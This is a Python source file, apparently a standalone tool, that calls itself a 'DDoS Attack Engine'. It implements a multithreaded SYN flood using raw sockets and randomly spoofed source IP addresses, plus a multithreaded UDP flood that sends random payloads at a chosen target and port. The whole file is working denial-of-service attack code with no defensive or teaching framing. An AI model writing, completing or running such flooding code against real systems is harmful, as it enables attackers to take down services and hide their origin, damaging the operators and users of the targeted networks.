"""DDoS Attack Engine"""
import socket, threading, time, struct, random, os

class SYNFlood:
    def __init__(self, target, port=80, threads=50):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = False
        self.packets_sent = 0
    
    def _build_syn(self):
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(1,65535), 0, 64, 6, 0,
                               socket.inet_aton(src_ip), socket.inet_aton(self.target))
        tcp_header = struct.pack("!HHIIBBHHH", src_port, self.port, random.randint(0, 0xFFFFFFFF),
                                0, 0x50, 0x02, 8192, 0, 0)
        return ip_header + tcp_header
    
    def _flood_thread(self, duration):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            end = time.time() + duration
            while self.running and time.time() < end:
                pkt = self._build_syn()
                s.sendto(pkt, (self.target, self.port))
                self.packets_sent += 1
            s.close()
        except PermissionError:
            print("[!] Root required for raw sockets")
        except Exception as e:
            print(f"[!] {e}")
    
    def start(self, duration=30):
        self.running = True
        self.packets_sent = 0
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._flood_thread, args=(duration,))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads: t.join()
        self.running = False
        return self.packets_sent

class UDPFlood:
    def __init__(self, target, port=53, threads=50):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = False
        self.bytes_sent = 0
    
    def _flood_thread(self, duration, size=1024):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(size)
        end = time.time() + duration
        while self.running and time.time() < end:
            try:
                s.sendto(payload, (self.target, self.port))
                self.bytes_sent += size
            except: pass
        s.close()
    
    def start(self, duration=30, size=1024):
        self.running = True
        self.bytes_sent = 0
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._flood_thread, args=(duration, size))
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads: t.join()
        self.running = False
        return self.bytes_sent
